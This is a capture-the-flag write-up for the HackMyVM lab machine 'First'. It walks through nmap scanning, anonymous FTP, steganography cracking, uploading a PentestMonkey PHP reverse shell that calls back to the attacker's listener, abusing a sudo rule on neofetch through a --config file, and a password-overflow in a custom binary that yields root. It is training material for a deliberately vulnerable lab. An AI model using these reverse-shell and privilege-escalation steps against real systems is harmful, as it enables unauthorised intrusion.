# First

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| First | WWFYMN | Beginner | HackMyVM |

**Summary:** The **First** machine is a beginner-level HackMyVM box that chains together several classic CTF techniques into a coherent attack path. Reconnaissance uncovers three open services: FTP (vsftpd 3.0.3) with anonymous access enabled, SSH (OpenSSH 8.2p1), and HTTP (Apache 2.4.41). The FTP server contains a JPEG image inside a named directory; steganographic analysis of that image (via `stegseek`) reveals a hidden file whose Base64-encoded content decodes to a hex string. That hex string, decoded through CyberChef, yields a secret web endpoint — `/t0d0_l1st_f0r_f1r5t` — which hosts a developer todo list hinting at an exposed PHP upload page and a vulnerable SUID-style binary. Directory brute-forcing confirms an `upload.php` file and a corresponding `/uploads/` directory, allowing a PHP reverse shell to be uploaded and executed, granting a `www-data` foothold. Lateral movement to the `first` user is achieved by abusing a `sudo` rule that permits `www-data` to run `/bin/neofetch` as `first`, exploited via the `--config` flag to execute arbitrary shell commands. Full root access is then obtained by exploiting a buffer-overflow vulnerability in the custom `/bin/secret` binary (runnable via `sudo` without a password), which — once its input buffer is overflowed — prompts for a command to execute as root.

---

## Reconnaissance

### Host Discovery

The target machine was identified on the local network using a custom PowerShell network-scanning script. The scan revealed a single VirtualBox guest at **192.168.100.138**.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.138 08:00:27:F2:B2:E7 VirtualBox
```

### Port & Service Enumeration

A full-port Nmap scan with service detection and default scripts was run against the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ nmap -sC -sV -p- -T4 192.168.100.138
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 22:31 WIB
Nmap scan report for 192.168.100.138
Host is up (0.050s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 09  2022 fifth
| drwxr-xr-x    2 0        0            4096 Aug 10  2022 first
| drwxr-xr-x    2 0        0            4096 Aug 09  2022 fourth
| drwxr-xr-x    2 0        0            4096 Aug 09  2022 seccond
|_drwxr-xr-x    2 0        0            4096 Aug 09  2022 third
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b8:57:5b:81:5a:78:1f:d6:ff:60:39:bb:32:a8:5d:cd (RSA)
|   256 65:8d:43:ec:63:77:d0:39:c0:1b:3e:40:d9:53:1e:ed (ECDSA)
|_  256 0f:02:ac:df:e1:31:3c:b2:59:f6:b7:59:09:f1:ff:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds
```

**Key findings:**
| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 21/tcp | FTP | vsftpd 3.0.3 | Anonymous login allowed; 5 directories exposed |
| 22/tcp | SSH | OpenSSH 8.2p1 | Ubuntu; standard attack surface |
| 80/tcp | HTTP | Apache 2.4.41 | No title; requires enumeration |

---

## Initial Access

### Step 1 — FTP Anonymous Login & File Retrieval

Anonymous FTP access was confirmed by Nmap. Logging in with username `anonymous` and a blank password revealed several directories. A hidden `.real` directory was present but empty. The only directory containing a file was `first/`, which held `first_Logo.jpg`.

A thorough enumeration of all directories was performed before retrieving the file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ ftp 192.168.100.138
Connected to 192.168.100.138.
220 (vsFTPd 3.0.3)
Name (192.168.100.138:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||31596|)
150 Here comes the directory listing.
drwxr-xr-x    8 0        118          4096 Aug 10  2022 .
drwxr-xr-x    8 0        118          4096 Aug 10  2022 ..
drwxr-xr-x    2 0        0            4096 Aug 09  2022 .real
drwxr-xr-x    2 0        0            4096 Aug 09  2022 fifth
drwxr-xr-x    2 0        0            4096 Aug 10  2022 first
drwxr-xr-x    2 0        0            4096 Aug 09  2022 fourth
drwxr-xr-x    2 0        0            4096 Aug 09  2022 seccond
drwxr-xr-x    2 0        0            4096 Aug 09  2022 third
226 Directory send OK.
ftp> cd .real
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||36559|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 09  2022 .
drwxr-xr-x    8 0        118          4096 Aug 10  2022 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> cd fi
fifth   first
ftp> cd fifth
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||10678|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 09  2022 .
drwxr-xr-x    8 0        118          4096 Aug 10  2022 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> cd first
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||60300|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 10  2022 .
drwxr-xr-x    8 0        118          4096 Aug 10  2022 ..
-rw-r--r--    1 0        0           33526 Aug 10  2022 first_Logo.jpg
226 Directory send OK.
ftp> get first_Logo.jpg
local: first_Logo.jpg remote: first_Logo.jpg
229 Entering Extended Passive Mode (|||51116|)
150 Opening BINARY mode data connection for first_Logo.jpg (33526 bytes).
100% |*****************************| 33526        1.61 MiB/s    00:00 ETA
226 Transfer complete.
33526 bytes received in 00:00 (1.46 MiB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||47580|)
150 Here comes the directory listing.
drwxr-xr-x    8 0        118          4096 Aug 10  2022 .
drwxr-xr-x    8 0        118          4096 Aug 10  2022 ..
drwxr-xr-x    2 0        0            4096 Aug 09  2022 .real
drwxr-xr-x    2 0        0            4096 Aug 09  2022 fifth
drwxr-xr-x    2 0        0            4096 Aug 10  2022 first
drwxr-xr-x    2 0        0            4096 Aug 09  2022 fourth
drwxr-xr-x    2 0        0            4096 Aug 09  2022 seccond
drwxr-xr-x    2 0        0            4096 Aug 09  2022 third
226 Directory send OK.
ftp> cd fourth
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||61588|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 09  2022 .
drwxr-xr-x    8 0        118          4096 Aug 10  2022 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||14459|)
150 Here comes the directory listing.
drwxr-xr-x    8 0        118          4096 Aug 10  2022 .
drwxr-xr-x    8 0        118          4096 Aug 10  2022 ..
drwxr-xr-x    2 0        0            4096 Aug 09  2022 .real
drwxr-xr-x    2 0        0            4096 Aug 09  2022 fifth
drwxr-xr-x    2 0        0            4096 Aug 10  2022 first
drwxr-xr-x    2 0        0            4096 Aug 09  2022 fourth
drwxr-xr-x    2 0        0            4096 Aug 09  2022 seccond
drwxr-xr-x    2 0        0            4096 Aug 09  2022 third
226 Directory send OK.
ftp> cd third
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||15549|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 09  2022 .
drwxr-xr-x    8 0        118          4096 Aug 10  2022 ..
226 Directory send OK.
ftp> cd ../seccond
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||32044|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 09  2022 .
drwxr-xr-x    8 0        118          4096 Aug 10  2022 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
```

All other directories (`fifth`, `fourth`, `third`, `seccond`, `.real`) were empty. Only `first/` yielded a file: a 33,526-byte JPEG.

### Step 2 — Steganography: Extracting the Hidden Message

`file` confirmed the image was a standard JPEG (968×507, JFIF 1.01, 96 DPI). `stegseek` was used to brute-force hidden steganographic payloads using the `rockyou.txt` wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ file first_Logo.jpg
first_Logo.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 968x507, components 3

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ stegseek first_Logo.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "firstgurl1"

[i] Original filename: "secret.txt".
[i] Extracting to "first_Logo.jpg.out".
```

`stegseek` instantly cracked the passphrase **`firstgurl1`** and extracted the hidden file `secret.txt`. Reading its raw content revealed a Base64-encoded string:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ cat first_Logo.jpg.out
SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==
```

Decoding the Base64 content revealed the plaintext message — including a hex-encoded path:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ cat first_Logo.jpg.out | base64 -d
Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first
```

The message contains a hex string: `2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74`. This was decoded using CyberChef with the **"From Hex"** recipe (Auto delimiter), confirming the hidden web endpoint:

![](image.png)

> **CyberChef output:** `/t0d0_l1st_f0r_f1r5t`

The message also serves as a deliberate breadcrumb from the machine's author: they intentionally obfuscated the endpoint name to defeat simple directory brute-forcing, embedding it instead as a steganographic+encoding challenge.

### Step 3 — Web Enumeration

Checking the HTTP root first confirmed it belonged to the user **first**, who left a casual note:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ curl -i http://192.168.100.138/
HTTP/1.1 200 OK
Date: Fri, 27 Feb 2026 15:36:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Tue, 09 Aug 2022 10:53:16 GMT
ETag: "55-5e5ccbd5b5eb8"
Accept-Ranges: bytes
Content-Length: 85
Vary: Accept-Encoding
Content-Type: text/html

I Finnaly got apache working, I am tired so I will do the todo list tomorrow. -first
```

Accessing the discovered endpoint revealed the developer's todo list — including two critical hints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ curl -i http://192.168.100.138/t0d0_l1st_f0r_f1r5t/
HTTP/1.1 200 OK
Date: Fri, 27 Feb 2026 15:38:48 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Wed, 10 Aug 2022 12:33:15 GMT
ETag: "cd-5e5e240c46761"
Accept-Ranges: bytes
Content-Length: 205
Vary: Accept-Encoding
Content-Type: text/html

todo for first:
        First: patch the buffer overflow in our secret file ;)
        2: remove the temporary upload php file
        3: put the server on the World Wide Web
        4: profit
<script>alert("DO THIS QUICK")</script>
```

**Two critical disclosures from the todo list:**
1. A **buffer overflow** exists in a "secret file" (binary) — foreshadowing the privilege escalation path.
2. A **temporary PHP upload file** has not been removed — this is the attack vector for initial shell access.

### Step 4 — Directory Brute-Forcing

Gobuster was used to enumerate content under the discovered endpoint, targeting PHP files specifically:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ gobuster dir -u http://192.168.100.138/t0d0_l1st_f0r_f1r5t/ -w /usr/share/wordlists/dirb/common.txt -x php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.138/t0d0_l1st_f0r_f1r5t/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.hta.php             (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.htpasswd.php        (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 205]
/photos               (Status: 301) [Size: 339] [--> http://192.168.100.138/t0d0_l1st_f0r_f1r5t/photos/]
/uploads              (Status: 301) [Size: 340] [--> http://192.168.100.138/t0d0_l1st_f0r_f1r5t/uploads/]
/upload.php           (Status: 200) [Size: 348]
Progress: 9226 / 9226 (100.00%)
===============================================================
Finished
===============================================================
```

**Critical findings:**
- `/upload.php` — A live PHP file upload page (the "temporary" file the developer forgot to remove).
- `/uploads/` — The directory where uploaded files are stored — and executed from.

### Step 5 — PHP Reverse Shell Upload

A PHP reverse shell from the PentestMonkey `php-reverse-shell.php` template was copied and edited to point back to the attacker's IP and port:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./revshell.php

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ vim revshell.php

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ head -n 50 revshell.php
...
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.100.1';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
...
```

A Netcat listener was started on port 4444, `revshell.php` was uploaded to `upload.php`, and then the shell was triggered:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ nc -lnvp 4444
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ curl http://192.168.100.138/t0d0_l1st_f0r_f1r5t/uploads/revshell.php
```

The shell connected back:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 65252
Linux first 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 15:51:13 up 22 min,  0 users,  load average: 0.14, 0.85, 0.57
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@first:/$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/first]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@first:/$ export SHELL=/bin/bash
www-data@first:/$ export TERM=xterm-256color
www-data@first:/$ stty rows 50 cols 200
```

A fully interactive TTY was established as **`www-data`** on the target. The kernel is Ubuntu with Linux 5.4.0-122-generic, confirming a relatively modern but unpatched system.

---

## Privilege Escalation

### Step 6 — Lateral Movement: www-data → first (via Neofetch sudo abuse)

With a shell as `www-data`, the environment was quickly enumerated. The `/etc/passwd` file confirmed two shell-capable users: `root` and `first`. The home directory of `first` was world-readable and contained `user.txt`:

```bash
www-data@first:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
first:x:1000:1000:First:/home/first:/bin/bash
www-data@first:/$ ls -la /home/first/
total 40
drwxr-xr-x 5 first first 4096 Aug 10  2022 .
drwxr-xr-x 3 root  root  4096 Aug  9  2022 ..
-rw------- 1 first first    8 Aug 10  2022 .bash_history
-rw-r--r-- 1 first first  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 first first 3771 Feb 25  2020 .bashrc
drwx------ 2 first first 4096 Aug  9  2022 .cache
drwxrwxr-x 3 first first 4096 Aug  9  2022 .local
-rw-r--r-- 1 first first  807 Feb 25  2020 .profile
drwx------ 2 first first 4096 Aug  9  2022 .ssh
-rw-r--r-- 1 first first    0 Aug  9  2022 .sudo_as_admin_successful
-rw-r--r-- 1 root  root    33 Aug  9  2022 user.txt
www-data@first:/$ which sudo
/usr/bin/sudo
www-data@first:/$ sudo -l
Matching Defaults entries for www-data on first:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on first:
    (first : first) NOPASSWD: /bin/neofetch
```

`www-data` can run `/bin/neofetch` as the user `first` without a password. The key insight is that `neofetch` supports a `--config` flag that allows specifying an arbitrary configuration file — and that configuration file is executed as a shell script by `neofetch`. This means any shell command placed in a file passed via `--config` will run in the context of the invoking user (`first`).

A one-line config was written to `/tmp/pwn.conf` that spawns a bash shell, then `neofetch` was invoked with it:

```bash
www-data@first:/$ echo 'exec /bin/bash' > /tmp/pwn.conf
www-data@first:/$ sudo -u first /bin/neofetch --config /tmp/pwn.conf
first@first:/$ id
uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Shell escalated to **`first`**. Notably, `first` is a member of the `lxd` group — a common LXD container escape vector — but a simpler path to root was available.

### Step 7 — Root Escalation: first → root (via /bin/secret Buffer Overflow)

Running `sudo -l` as `first` revealed a second powerful `sudo` rule:

```bash
first@first:~$ sudo -l
Matching Defaults entries for first on first:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/bin\:/snap/bin

User first may run the following commands on first:
    (ALL) NOPASSWD: /bin/secret
first@first:~$ file /bin/secret
/bin/secret: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bb95d621ae4c195a36cc3f0da763d96099a3c7ae, for GNU/Linux 3.2.0, not stripped
first@first:~$ ls -la /bin/secret
-rwxr-xr-x 1 root root 16944 Aug  9  2022 /bin/secret
```

`/bin/secret` is a non-stripped, 64-bit ELF binary owned by root. The developer's todo list had already hinted at a **buffer overflow** in the "secret file". Running it with a large input overflows the buffer, bypassing whatever password check exists, and the program then prompts for a command to execute — at root privilege (since it was invoked with `sudo`):

```bash
first@first:/$ sudo /bin/secret
pass: AAAAAAAAAAA
correct, input command:/bin/bash
root@first:/# id
uid=0(root) gid=0(root) groups=0(root)
root@first:/# whoami
root
root@first:/# hostname
first
root@first:/# cat /home/first/user.txt /root/r00t.txt
312[REDACTED]
477[REDACTED]
```

Sending `AAAAAAAAAAA` (11+ `A` characters) as the password overflowed the input buffer, corrupted the stack-based comparison, and caused the program to accept the input as "correct". It then prompted for a command, to which `/bin/bash` was supplied — spawning a root shell. Both flags were captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Full-port Nmap scan of `192.168.100.138` revealed three services: FTP (vsftpd 3.0.3) with anonymous access, SSH (OpenSSH 8.2p1), and HTTP (Apache 2.4.41).
2. **Vulnerability Discovery**: Anonymous FTP login exposed `first_Logo.jpg`; `stegseek` cracked the steganographic payload (passphrase: `firstgurl1`), revealing a Base64-encoded message containing a hex-encoded secret web path (`/t0d0_l1st_f0r_f1r5t`), decoded via CyberChef. The todo page at that endpoint disclosed an exposed `upload.php` and a buffer-overflow vulnerability in `/bin/secret`.
3. **Exploitation**: Gobuster confirmed `upload.php` and `/uploads/` were live. A PHP reverse shell was uploaded and triggered via `curl`, yielding a `www-data` shell on the server.
4. **Internal Enumeration**: `sudo -l` as `www-data` revealed a passwordless `sudo` rule allowing `/bin/neofetch` to be run as user `first`. The `--config` flag of `neofetch` was abused to execute arbitrary shell commands, escalating to the `first` user.
5. **Privilege Escalation**: `sudo -l` as `first` revealed a passwordless `sudo` rule for `/bin/secret` (ALL users). The binary contained a stack buffer overflow: supplying `AAAAAAAAAAA` as the password bypassed the authentication check, and entering `/bin/bash` as the command spawned a root shell. Both `user.txt` and `r00t.txt` flags were retrieved.
